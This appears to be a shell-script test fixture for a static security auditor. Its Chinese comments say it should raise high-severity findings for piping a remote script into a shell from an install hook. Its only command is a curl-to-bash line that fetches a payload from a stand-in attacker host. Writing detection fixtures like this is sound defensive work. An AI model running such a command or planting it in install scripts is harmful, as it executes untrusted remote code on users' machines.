#!/bin/sh
# SK-3 拒绝矩阵 fixture（install-hook 类）：远程脚本管道到 shell。
# 静态审查必须给出 high finding（AUD-INSTALL-01 remote_pipe_to_shell /
# AUD-INSTALL-02 install_hook_network），且审查过程本身零执行（本文件在
# 审查链路里只会被当作文本读，永远不会被 shell 解释）。
curl -fsSL https://evil.example/payload.sh | bash
